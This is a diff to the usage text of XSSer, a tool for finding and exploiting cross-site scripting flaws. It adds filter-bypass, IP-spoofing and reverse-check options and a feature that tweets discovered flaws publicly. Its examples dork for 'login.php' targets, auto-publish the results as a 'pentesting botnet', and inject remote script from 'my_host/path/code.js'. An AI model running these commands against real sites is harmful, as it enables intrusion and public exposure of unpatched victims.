@@ -2,7 +2,7 @@
 Introduction:
 ==============================
 
-Cross Site "Scripter" is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based aplications.
+Cross Site "Scripter" is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.
 
 It contains several options to try to bypass certain filters, and various special techniques of code injection.
 
@@ -20,7 +20,7 @@ Options:
   -h, --help            show this help message and exit
   -s, --statistics      show advanced statistics output results
   -v, --verbose         active verbose mode output results
-  --gtk                 launch XSSer GTK Interface
+  --gtk                 launch XSSer GTK Interface (Wizard included!)
 
   *Special Features*:
     You can choose Vector(s) and Bypasser(s) to inject code with this
@@ -36,8 +36,8 @@ Options:
     -u URL, --url=URL   Enter target(s) to audit
     -i READFILE         Read target urls from a file
     -d DORK             Process search engine dork results as target urls
-    --De=DORK_ENGINE    Search engine to use for dorking (bing, altavista, 
-                        yahoo, baidu, yandex, youdao, webcrawler, ask, etc. 
+    --De=DORK_ENGINE    Search engine to use for dorking (bing, altavista,
+                        yahoo, baidu, yandex, youdao, webcrawler, google, etc.
                         See dork.py file to check for available engines)
 
   *Select type of HTTP/HTTPS Connection(s)*:
@@ -52,28 +52,49 @@ Options:
 
   *Configure Request(s)*:
     These options can be used to specify how to connect to target(s)
-    payload(s). You can select multiple:
+    payload(s). You can choose multiple:
 
     --cookie=COOKIE     Change your HTTP Cookie header
+    --drop-cookie       Ignore Set-Cookie header from response
     --user-agent=AGENT  Change your HTTP User-Agent header (default SPOOFED)
     --referer=REFERER   Use another HTTP Referer header (default NONE)
+    --xforw             Set your HTTP X-Forwarded-For with random IP values
+    --xclient           Set your HTTP X-Client-IP with random IP values
     --headers=HEADERS   Extra HTTP headers newline separated
-    --auth-type=ATYPE   HTTP Authentication type (value Basic or Digest)
-    --auth-cred=ACRED   HTTP Authentication credentials (value name:password)
+    --auth-type=ATYPE   HTTP Authentication type (Basic, Digest, GSS or NTLM)
+    --auth-cred=ACRED   HTTP Authentication credentials (name:password)
     --proxy=PROXY       Use proxy server (tor: http://localhost:8118)
-    --timeout=TIMEOUT   Select your Timeout (default 30)
-    --delay=DELAY       Delay in seconds between each HTTP request (default 8)
+    --ignore-proxy      Ignore system default HTTP proxy
+    --timeout=TIMEOUT   Select your timeout (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 1)
     --threads=THREADS   Maximum number of concurrent HTTP requests (default 5)
-    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --delay=DELAY       Delay in seconds between each HTTP request (default 0)
+    --tcp-nodelay       Use the TCP_NODELAY option
+    --follow-redirects  XSSer will follow server redirection responses (302)
+    --follow-limit=FLI  Set how many times XSSer will follow redirections
+                        (default 50)
 
-  *Checker systems*:
+  *Checker Systems*:
     This options are usefull to know if your target(s) have some filters
-    against XSS attacks and-or repeat all code who recieved:
+    against XSS attacks, to reduce 'false positive' results and to perform
+    more advanced tests:
 
-    --hash              send a hash to pre-check if target repeats all content
-                        recieved (usefull to predict 'false positive' results)
-    --heuristic         launch a heuristic testing to discover who parameters
-                        can be filtered on target(s) code: ;\/<>"'=
+    --no-head           NOT verify the stability of the url (codes: 200|302)
+                        with a HEAD pre-check request
+    --alive=ISALIVE     set limit of every how much errors XSSer must to
+                        verify that target is alive
+    --hash              send an unique hash, without vectors, to pre-check if
+                        target(s) repeats all content recieved
+    --heuristic         launch a heuristic testing to discover which
+                        parameters are filtered on target(s) code: ;\/<>"'=
+    --checkaturl=ALT    check for a valid XSS response from target(s) at an
+                        alternative url. 'blind XSS'
+    --checkmethod=ALTM  check responses from target(s) using a different
+                        connection type: GET or POST (default: GET)
+    --checkatdata=ALD   check responses from target(s) using an alternative
+                        payload (default: same than first injection)
+    --reverse-check     establish a reverse connection from target(s) to XSSer
+                        to certificate that is 100% vulnerable
 
   *Select Vector(s)*:
     These options can be used to specify a XSS vector source code to
@@ -82,10 +103,11 @@ Options:
 
     --payload=SCRIPT    OWN  - Insert your XSS construction -manually-
     --auto              AUTO - Insert XSSer 'reported' vectors from file
+                        (HTML5 vectors included!)
 
   *Select Bypasser(s)*:
     These options can be used to encode selected vector(s) to try to
-    bypass all possible anti-XSS filters on target(s) code and some IPS
+    bypass possible anti-XSS filters on target(s) code and possible IPS
     rules, if the target use it. Also, can be combined with other
     techniques to provide encoding:
 
@@ -102,7 +124,7 @@ Options:
 
   *Special Technique(s)*:
     These options can be used to try to inject code using different type
-    of XSS techniques. You can select multiple:
+    of XSS techniques. You can choose multiple:
 
     --Coo               COO - Cross Site Scripting Cookie injection
     --Xsa               XSA - Cross Site Agent Scripting
@@ -111,6 +133,7 @@ Options:
     --Dom               DOM - Document Object Model injections
     --Ind               IND - HTTP Response Splitting Induced code
     --Anchor            ANC - Use Anchor Stealth payloader (DOM shadows!)
+    --Phpids            PHP - Exploit PHPIDS bug (0.6.5) to bypass filters
 
   *Select Final injection(s)*:
     These options can be used to specify the final code to inject in
@@ -136,9 +159,11 @@ Options:
     --update            check for XSSer latest stable version
     --save              output all results directly to template (XSSlist.dat)
     --xml=FILEXML       output 'positives' to aXML file (--xml filename.xml)
-    --publish           output 'positives' to Social Networks (identi.ca)
     --short=SHORTURLS   display -final code- shortered (tinyurl, is.gd)
     --launch            launch a browser at the end with each XSS discovered
+    --tweet             publish each XSS discovered into the 'Grey Swarm!'
+    --tweet-tags=TT     add more tags to your XSS discovered publications
+                        (default: #xss) - (ex: #xsser #vulnerability)
 
 ================================================================
 Examples of usage:
@@ -217,7 +242,7 @@ $ python XSSer.py -d "login.php" --De "ask" --xml "security_report_XSSer_Dork_cu
 * Publish output 'positives' injections of a dorking search (using "duck" dorker) directly to http://identi.ca
 (federated XSS pentesting botnet)
 
-$ python XSSer.py -d "login.php" --De "duck" --publish
+$ python XSSer.py -d "login.php" --De "duck" --tweet
 
 * Examples online:
 
@@ -248,4 +273,3 @@ $ python XSSer.py -u "host.com" -g "vulnerable_path" --payload "valid_vector_inj
 * Exploiting our "own" -remote code- in a payload discovered using fuzzing and launch it in a browser directly
  
 $ python XSSer.py -u "host.com" -g "vulnerable_path" --auto --Fr "my_host/path/code.js" --launch
-
